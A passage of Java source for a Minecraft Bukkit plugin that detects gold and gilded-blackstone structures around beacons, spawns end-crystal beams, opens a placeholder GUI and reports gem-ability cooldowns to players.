        Block block6 = location.clone().add(-1, 0, -1).getBlock();
        Block block7 = location.clone().add(-1, 0, 1).getBlock();
        Block block8 = location.clone().add(1, 0, -1).getBlock();
        Block block9 = location.clone().add(0, 1, 0).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE && block2.getType() == Material.GILDED_BLACKSTONE && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GILDED_BLACKSTONE && block5.getType() == Material.GOLD_BLOCK && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GOLD_BLOCK && block8.getType() == Material.GOLD_BLOCK && block9.getType() == Material.BEACON;
    }

    private boolean GildedBlackstoneWest(Location location) {
        Block block1 = location.clone().add(-1, 0, 0).getBlock();
        Block block2 = location.clone().add(-2, 0, 0).getBlock();
        Block block3 = location.clone().add(-1, 0, 1).getBlock();
        Block block4 = location.clone().add(-1, 0, -1).getBlock();
        Block block5 = location.clone().add(-2, 0, -1).getBlock();
        Block block6 = location.clone().add(-2, 0, 1).getBlock();
        Block block7 = location.clone().add(0, 0, 1).getBlock();
        Block block8 = location.clone().add(0, 0, -1).getBlock();
        Block block9 = location.clone().add(-1, 1, 0).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS &&
                block2.getType() == Material.GILDED_BLACKSTONE &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GILDED_BLACKSTONE &&
                block5.getType() == Material.GOLD_BLOCK &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GOLD_BLOCK &&
                block8.getType() == Material.GOLD_BLOCK &&
                block9.getType() == Material.BEACON;

    }

    private boolean GildedBlackstoneEast(Location location) {
        Block block1 = location.clone().add(1, 0, 0).getBlock();
        Block block2 = location.clone().add(2, 0, 0).getBlock();
        Block block3 = location.clone().add(1, 0, 1).getBlock();
        Block block4 = location.clone().add(1, 0, -1).getBlock();
        Block block5 = location.clone().add(2, 0, 1).getBlock();
        Block block6 = location.clone().add(2, 0, -1).getBlock();
        Block block7 = location.clone().add(0, 0, 1).getBlock();
        Block block8 = location.clone().add(0, 0, -1).getBlock();
        Block block9 = location.clone().add(1, 1, 0).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS &&
                block2.getType() == Material.GILDED_BLACKSTONE &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GILDED_BLACKSTONE &&
                block5.getType() == Material.GOLD_BLOCK &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GOLD_BLOCK &&
                block8.getType() == Material.GOLD_BLOCK &&
                block9.getType() == Material.BEACON;

    }

    private boolean GildedBlackstoneSouth(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock();
        Block block2 = location.clone().add(0, 0, 2).getBlock();
        Block block3 = location.clone().add(1, 0, 2).getBlock();
        Block block4 = location.clone().add(1, 0, 1).getBlock();
        Block block5 = location.clone().add(1, 0, 0).getBlock();
        Block block6 = location.clone().add(-1, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 1).getBlock();
        Block block8 = location.clone().add(-1, 0, 2).getBlock();
        Block block9 = location.clone().add(0, 1, 1).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS &&
                block2.getType() == Material.GILDED_BLACKSTONE &&
                block3.getType() == Material.GOLD_BLOCK &&
                block4.getType() == Material.GILDED_BLACKSTONE &&
                block5.getType() == Material.GOLD_BLOCK &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GILDED_BLACKSTONE &&
                block8.getType() == Material.GOLD_BLOCK &&
                block9.getType() == Material.BEACON;
    }


    private boolean GildedBlackstoneNorth(Location location) {
        Block block1 = location.clone().add(0, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -2).getBlock();
        Block block3 = location.clone().add(1, 0, -1).getBlock();
        Block block4 = location.clone().add(-1, 0, -1).getBlock();
        Block block5 = location.clone().add(1, 0, -2).getBlock();
        Block block6 = location.clone().add(-1, 0, -2).getBlock();
        Block block7 = location.clone().add(1, 0, 0).getBlock();
        Block block8 = location.clone().add(-1, 0, 0).getBlock();
        Block block9 = location.clone().add(0, 1, -1).getBlock();
        return block1.getType() == Material.ANCIENT_DEBRIS &&
                block2.getType() == Material.GILDED_BLACKSTONE &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GILDED_BLACKSTONE &&
                block5.getType() == Material.GOLD_BLOCK &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GOLD_BLOCK &&
                block8.getType() == Material.GOLD_BLOCK &&
                block9.getType() == Material.BEACON;

    }

    private boolean GoldBlockSouthEast(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock(); // Top left G
        Block block2 = location.clone().add(0, 0, 2).getBlock();
        Block block3 = location.clone().add(1, 0, 2).getBlock();
        Block block4 = location.clone().add(2, 0, 2).getBlock();
        Block block5 = location.clone().add(2, 0, 1).getBlock();
        Block block6 = location.clone().add(2, 0, 0).getBlock();
        Block block7 = location.clone().add(1, 0, 0).getBlock();
        Block block8 = location.clone().add(1, 0, 1).getBlock();
        Block block9 = location.clone().add(1, 1, 1).getBlock();

        return block1.getType() == Material.GILDED_BLACKSTONE &&
                block2.getType() == Material.GOLD_BLOCK &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GOLD_BLOCK &&
                block5.getType() == Material.GILDED_BLACKSTONE &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GILDED_BLACKSTONE &&
                block8.getType() == Material.ANCIENT_DEBRIS &&
                block9.getType() == Material.BEACON;
    }


    private boolean GoldBlockSouthWest(Location location) {
        Block block1 = location.clone().add(0, 0, 1).getBlock();
        Block block2 = location.clone().add(0, 0, 2).getBlock();
        Block block3 = location.clone().add(-1, 0, 2).getBlock();
        Block block4 = location.clone().add(-2, 0, 2).getBlock();
        Block block5 = location.clone().add(-2, 0, 1).getBlock();
        Block block6 = location.clone().add(-2, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 0).getBlock();
        Block block8 = location.clone().add(-1, 0, 1).getBlock();
        Block block9 = location.clone().add(-1, 1, 1).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE &&
                block2.getType() == Material.GOLD_BLOCK &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GOLD_BLOCK &&
                block5.getType() == Material.GILDED_BLACKSTONE &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GILDED_BLACKSTONE &&
                block8.getType() == Material.ANCIENT_DEBRIS &&
                block9.getType() == Material.BEACON;
    }

    private boolean GoldBlockNorthWest(Location location) {
        Block block1 = location.clone().add(0, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -2).getBlock();
        Block block3 = location.clone().add(-1, 0, -2).getBlock();
        Block block4 = location.clone().add(-2, 0, -2).getBlock();
        Block block5 = location.clone().add(-2, 0, -1).getBlock();
        Block block6 = location.clone().add(-2, 0, 0).getBlock();
        Block block7 = location.clone().add(-1, 0, 0).getBlock();
        Block block8 = location.clone().add(-1, 0, -1).getBlock();
        Block block9 = location.clone().add(-1, 1, -1).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE &&
                block2.getType() == Material.GOLD_BLOCK &&
                block3.getType() == Material.GILDED_BLACKSTONE &&
                block4.getType() == Material.GOLD_BLOCK &&
                block5.getType() == Material.GILDED_BLACKSTONE &&
                block6.getType() == Material.GOLD_BLOCK &&
                block7.getType() == Material.GILDED_BLACKSTONE &&
                block8.getType() == Material.ANCIENT_DEBRIS &&
                block9.getType() == Material.BEACON;
    }

    private boolean GoldBlockNorthEast(Location location) {
        Block block1 = location.clone().add(0, 0, -1).getBlock();
        Block block2 = location.clone().add(0, 0, -2).getBlock();
        Block block3 = location.clone().add(1, 0, -2).getBlock();
        Block block4 = location.clone().add(2, 0, -2).getBlock();
        Block block5 = location.clone().add(2, 0, -1).getBlock();
        Block block6 = location.clone().add(2, 0, 0).getBlock();
        Block block7 = location.clone().add(1, 0, 0).getBlock();
        Block block8 = location.clone().add(1, 0, -1).getBlock();
        Block block9 = location.clone().add(1, 1, -1).getBlock();
        return block1.getType() == Material.GILDED_BLACKSTONE && block2.getType() == Material.GOLD_BLOCK && block3.getType() == Material.GILDED_BLACKSTONE && block4.getType() == Material.GOLD_BLOCK && block5.getType() == Material.GILDED_BLACKSTONE && block6.getType() == Material.GOLD_BLOCK && block7.getType() == Material.GILDED_BLACKSTONE && block8.getType() == Material.ANCIENT_DEBRIS && block9.getType() == Material.BEACON;
    }


    private void spawnBeam1(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(-1, 0, 1); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();

        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon

                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);

            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam2(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(1, 0, 1); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }


    private void spawnBeam3(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(-1, 0, -1); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam4(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(1, 0, -1); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam5(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(0, 0, -1); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam7(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(1, 0, 0); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam6(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(0, 0, 1); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam8(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(-1, 0, 0); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam9(World world, Location location, double verticalOffset) {
        Location beaconLocation = location.clone().add(0, 0, 0); // Beam directly on top of beacon
        Block beaconBlock = beaconLocation.getBlock();
        if (beaconBlock.getType() == Material.ANCIENT_DEBRIS) {
            Location crystalLocation = beaconLocation.clone().add(0.5, verticalOffset, 0.5); // Adjust as needed
            // Check if there's already an end crystal nearby
            boolean crystalExists = false;
            for (Entity entity : world.getNearbyEntities(crystalLocation, 1, 1, 1)) {
                if (entity.getType() == EntityType.ENDER_CRYSTAL) {
                    crystalExists = true;
                    break;
                }
            }

            if (!crystalExists) {
                // Spawn the end crystal 120 blocks above the beacon
                crystalLocation.add(0, 120, 0);
                EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, EntityType.ENDER_CRYSTAL);
                enderCrystal.setBeamTarget(beaconLocation.clone().add(0, -2, 0));
                removeExtraCrystals(world, beaconLocation);
            }
        } else {
            getLogger().warning("No beacon block found at the specified location!");
        }
    }

    private void spawnBeam(World world, Location location) {
        Location crystalLocation = location.clone().add(0, 121, 0); // 120 blocks above beacon + 1 for the beacon height
        EnderCrystal enderCrystal = (EnderCrystal) world.spawnEntity(crystalLocation, org.bukkit.entity.EntityType.ENDER_CRYSTAL);
        enderCrystal.setBeamTarget(location.clone().add(0, -2, 0));
        removeExtraCrystals(world, location);
    }

    private void killBeam(World world, Location beaconLocation) {
        double beaconY = beaconLocation.getY();
        for (EnderCrystal crystal : world.getEntitiesByClass(EnderCrystal.class)) {
            Location crystalLocation = crystal.getLocation();
            if (crystalLocation.getBlockX() == beaconLocation.getBlockX() &&
                    crystalLocation.getBlockZ() == beaconLocation.getBlockZ() &&
                    crystalLocation.getY() > beaconY) {
                crystal.remove();
                System.out.println("Removed an end crystal.");
                break;  // Exit loop after removing one crystal
            }
        }
    }

    private void removeEndCrystalAboveBeacon(World world, Location beaconLocation) {
        for (EnderCrystal crystal : world.getEntitiesByClass(EnderCrystal.class)) {
            Location crystalLocation = crystal.getLocation();
            if (isAboveBeacon(crystalLocation, beaconLocation)) {
                crystal.remove();
                getLogger().info("Removed an end crystal above the beacon.");
                break;
            }
        }
    }

    private boolean isAboveBeacon(Location crystalLocation, Location beaconLocation) {
        return crystalLocation.getBlockX() == beaconLocation.getBlockX() &&
                crystalLocation.getBlockZ() == beaconLocation.getBlockZ() &&
                crystalLocation.getY() > beaconLocation.getY() &&
                crystalLocation.getY() <= beaconLocation.getY() + 130; // Maximum height difference
    }

    private void removeExtraCrystals(World world, Location beaconLocation) {
        List<EnderCrystal> nearbyCrystals = world.getEntitiesByClass(EnderCrystal.class)
                .stream()
                .filter(crystal -> {
                    Location crystalLocation = crystal.getLocation();
                    return crystalLocation.getBlockX() == beaconLocation.getBlockX() &&
                            crystalLocation.getBlockZ() == beaconLocation.getBlockZ() &&
                            crystalLocation.getY() > beaconLocation.getY() &&
                            crystalLocation.getY() <= beaconLocation.getY() + 130;
                })
                .collect(Collectors.toList());

        // If there is more than one end crystal, remove the extras
        if (nearbyCrystals.size() > 1) {
            for (int i = 1; i < nearbyCrystals.size(); i++) {
                nearbyCrystals.get(i).remove();
                getLogger().info("Removed extra end crystal.");
            }
        }
    }

    @EventHandler
    public void ReviveGui(PlayerDropItemEvent event) {
        Item item = event.getItemDrop();
        Player player = event.getPlayer();

        getLogger().info("Item dropped by " + player.getName());

        // Store the item location
        Location itemLocation = item.getLocation();
        itemLocations.put(player, itemLocation);

        new BukkitRunnable() {
            @Override
            public void run() {
                if (!item.isValid() || item.isDead()) {
                    getLogger().info("Item is no longer valid or is dead, cancelling task.");
                    cancel();
                    return;
                }

                Block block = item.getLocation().getBlock();
                getLogger().info("Checking block at " + block.getLocation());

                if (block.getType() == Material.BEACON) {
                    getLogger().info("Item is on top of a beacon, checking for ancient debris below.");
                    if (checkAncientDebrisAndPatterns(block)) {
                        getLogger().info("Ancient debris and required block patterns found, opening GUI.");
                        openGui(player); // Pass item location
                        item.remove(); // Optionally remove the item
                        cancel();
                    }
                } else {
                    Block belowBlock = item.getLocation().subtract(0, 1, 0).getBlock();
                    if (belowBlock.getType() == Material.BEACON) {
                        getLogger().info("Item is above a beacon, checking for ancient debris below.");
                        if (checkAncientDebrisAndPatterns(belowBlock)) {
                            getLogger().info("Ancient debris and required block patterns found, opening GUI.");
                            openGui(player); // Pass item location
                            item.remove(); // Optionally remove the item
                            cancel();
                        }
                    }
                }
            }
        }.runTaskTimer(this, 0L, 5L); // Check every 5 ticks
    }

    private boolean checkAncientDebrisAndPatterns(Block beaconBlock) {
        Block blockBelow = beaconBlock.getLocation().subtract(0, 1, 0).getBlock();
        if (blockBelow.getType() != Material.ANCIENT_DEBRIS) {
            return false;
        }

        boolean gildedBlackstonePattern = checkGildedBlackstonePattern(blockBelow);
        boolean goldBlockPattern = checkGoldBlockPattern(blockBelow);

        return gildedBlackstonePattern && goldBlockPattern;
    }

    private boolean checkGildedBlackstonePattern(Block blockBelow) {
        Block north = blockBelow.getLocation().add(0, 0, -1).getBlock();
        Block south = blockBelow.getLocation().add(0, 0, 1).getBlock();
        Block west = blockBelow.getLocation().add(-1, 0, 0).getBlock();
        Block east = blockBelow.getLocation().add(1, 0, 0).getBlock();

        return north.getType() == Material.GILDED_BLACKSTONE &&
                south.getType() == Material.GILDED_BLACKSTONE &&
                west.getType() == Material.GILDED_BLACKSTONE &&
                east.getType() == Material.GILDED_BLACKSTONE;
    }

    private boolean checkGoldBlockPattern(Block blockBelow) {
        Block northEast = blockBelow.getLocation().add(1, 0, -1).getBlock();
        Block northWest = blockBelow.getLocation().add(-1, 0, -1).getBlock();
        Block southWest = blockBelow.getLocation().add(-1, 0, 1).getBlock();
        Block southEast = blockBelow.getLocation().add(1, 0, 1).getBlock();

        return northEast.getType() == Material.GOLD_BLOCK &&
                northWest.getType() == Material.GOLD_BLOCK &&
                southWest.getType() == Material.GOLD_BLOCK &&
                southEast.getType() == Material.GOLD_BLOCK;
    }


    private void openGui(Player player) {
        Inventory gui = Bukkit.createInventory(null, 54, "Your GUI Title");
        // Add items to the GUI as needed
        gui.setItem(0, new ItemStack(Material.DIAMOND));
        gui.setItem(1, new ItemStack(Material.EMERALD));

        player.openInventory(gui);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (event.getView().getTitle().equals("Your GUI Title")) {
            event.setCancelled(true);
            Player player = (Player) event.getWhoClicked();
            ItemStack clickedItem = event.getCurrentItem();

            if (clickedItem != null && clickedItem.getType() == Material.DIAMOND) {
                Location nearestBeaconLocation = findNearestBeaconWithAncientDebris(player.getLocation());
                if (nearestBeaconLocation != null) {
                    // Lightning will spawn at the nearest beacon with ancient debris
                    player.getWorld().strikeLightning(nearestBeaconLocation);
                    player.sendMessage("Lightning spawned at the nearest beacon with ancient debris!");
                } else {
                    player.sendMessage("No valid beacon found with ancient debris.");
                }
                player.closeInventory();
            }
        }
    }

    private Location findNearestBeaconWithAncientDebris(Location origin) {
        Location nearestLocation = null;
        double nearestDistanceSquared = Double.MAX_VALUE;

        for (Block block : getNearbyBlocks(origin, 50)) { // Check blocks within 50 blocks radius
            if (block.getType() == Material.BEACON) {
                Block blockBelow = block.getLocation().subtract(0, 1, 0).getBlock();
                if (blockBelow.getType() == Material.ANCIENT_DEBRIS) {
                    boolean gildedBlackstonePattern = checkGildedBlackstonePattern(blockBelow);
                    boolean goldBlockPattern = checkGoldBlockPattern(blockBelow);

                    if (gildedBlackstonePattern && goldBlockPattern) {
                        double distanceSquared = origin.distanceSquared(block.getLocation());
                        if (distanceSquared < nearestDistanceSquared) {
                            nearestDistanceSquared = distanceSquared;
                            nearestLocation = block.getLocation();
                        }
                    }
                }
            }
        }
        return nearestLocation;
    }

    private Iterable<Block> getNearbyBlocks(Location center, int radius) {
        return new Iterable<Block>() {
            @Override
            public java.util.Iterator<Block> iterator() {
                return new java.util.Iterator<Block>() {
                    private final int xMin = center.getBlockX() - radius;
                    private final int xMax = center.getBlockX() + radius;
                    private final int yMin = center.getBlockY() - radius;
                    private final int yMax = center.getBlockY() + radius;
                    private final int zMin = center.getBlockZ() - radius;
                    private final int zMax = center.getBlockZ() + radius;

                    private Block nextBlock = nextBlock();

                    @Override
                    public boolean hasNext() {
                        return nextBlock != null;
                    }

                    @Override
                    public Block next() {
                        Block currentBlock = nextBlock;
                        nextBlock = nextBlock();
                        return currentBlock;
                    }

                    private Block nextBlock() {
                        for (int x = xMin; x <= xMax; x++) {
                            for (int y = yMin; y <= yMax; y++) {
                                for (int z = zMin; z <= zMax; z++) {
                                    Block block = center.getWorld().getBlockAt(x, y, z);
                                    if (block.getType() != Material.AIR) {
                                        return block;
                                    }
                                }
                            }
                        }
                        return null;
                    }
                };
            }
        };
    }

    @EventHandler
    public void DimensaionalDriftCooldown(PlayerInteractEvent DimensaionalDriftCooldown) {
        Player GemAbilityCooldownsPlayer = DimensaionalDriftCooldown.getPlayer();
        ItemStack OffHandItem = GemAbilityCooldownsPlayer.getInventory().getItemInOffHand();
        if (DimensaionalDriftCooldown.getAction() == Action.RIGHT_CLICK_AIR || DimensaionalDriftCooldown.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (AstraGem(OffHandItem) || Astragem(OffHandItem)) {
                if (GemAbilityCooldownsPlayer.getPersistentDataContainer().has(Dimensional_Drift, PersistentDataType.INTEGER)) {
                    UUID playerId = GemAbilityCooldownsPlayer.getUniqueId();
                    if (AstraGem_Power_4_DimensionalDrift.containsKey(playerId)) {
                        long time = AstraGem_Power_4_DimensionalDrift.get(playerId);
                        if (time > 0) {
                            int minutes = (int) (time / 60);
                            int seconds = (int) (time % 60);
                            String message;
                            if (minutes > 0 && seconds > 0) {
                                message = minutes + "m " + seconds + "s";
                            } else if (minutes > 0 && seconds == 0) {
                                message = minutes + "m";
                            } else {
                                message = seconds + "s";
                            }
                            GemAbilityCooldownsPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(160, 32, 240)) + "\uD83D\uDD2E " + ChatColor.RED + "Your " + net.md_5.bungee.api.ChatColor.of(new Color(160, 32, 240)) + "Dimensional Drift " + ChatColor.RED + "skill is on cooldown for " + net.md_5.bungee.api.ChatColor.of(new Color(160, 32, 240)) + message);
                        } else {
                            GemAbilityCooldownsPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(160, 32, 240)) + "\uD83D\uDD2E " + ChatColor.RED + "Your " + net.md_5.bungee.api.ChatColor.of(new Color(160, 32, 240)) + "Dimensional Drift " + ChatColor.RED + "skill is on cooldown for " + ChatColor.GREEN + "Ready!");
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    public void PuffCircleCooldown(PlayerInteractEvent PuffCircleCooldown) {
        Player PuffCircleCooldownPlayer = PuffCircleCooldown.getPlayer();
        ItemStack PuffGemItem = PuffCircleCooldownPlayer.getInventory().getItemInMainHand();
        if (PuffCircleCooldown.getAction() == Action.LEFT_CLICK_AIR || PuffCircleCooldown.getAction() == Action.LEFT_CLICK_BLOCK) {
            if (PuffGem(PuffGemItem) || PuffGem(PuffGemItem)) {
                if (PuffCircleCooldownPlayer.getPersistentDataContainer().has(PᴜғғCɪʀᴄʟᴇ, PersistentDataType.INTEGER)) {
                    UUID playerId = PuffCircleCooldownPlayer.getUniqueId();
                    if (PuffGem_Power_1_PuffCircle.containsKey(playerId)) {
                        long time = PuffGem_Power_1_PuffCircle.get(playerId);
                        if (time > 0) {
                            int minutes = (int) (time / 60);
                            int seconds = (int) (time % 60);
                            String message;
                            if (minutes > 0 && seconds > 0) {
                                message = minutes + "m " + seconds + "s";
                            } else if (minutes > 0 && seconds == 0) {
                                message = minutes + "m";
                            } else {
                                message = seconds + "s";
                            }
                            PuffCircleCooldownPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + ChatColor.RED + "Your " + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "☁Breezy Bash " + ChatColor.RED + "skill is on cooldown for " + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + message);
                        } else {
                            PuffCircleCooldownPlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + ChatColor.RED + "Your " + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "☁Breezy Bash " + ChatColor.RED + "skill is on cooldown for " + ChatColor.GREEN + "Ready!");
                        }
                    }
                }
            }
        }
    }


    @EventHandler
    public void WealthGemAbilityPockets(PlayerInteractEvent WealthGemAbilityPockets, InventoryClickEvent event) {
        Player player = WealthGemAbilityPockets.getPlayer();
        ItemStack OffHandItem = player.getInventory().getItemInOffHand();
        if (WealthGemAbilityPockets.getAction() == Action.RIGHT_CLICK_AIR || WealthGemAbilityPockets.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (WealthGem(OffHandItem)) {
                player.openWorkbench(null, true);
                event.getClickedInventory().addItem(event.getCurrentItem());
            }
        }
    }


    @EventHandler
    public void AstraGemAbilityDimensionalDrift(PlayerInteractEvent AstraGemAbilityDimensionalDrift) {
        Player DimensionalDriftPlayer = AstraGemAbilityDimensionalDrift.getPlayer();
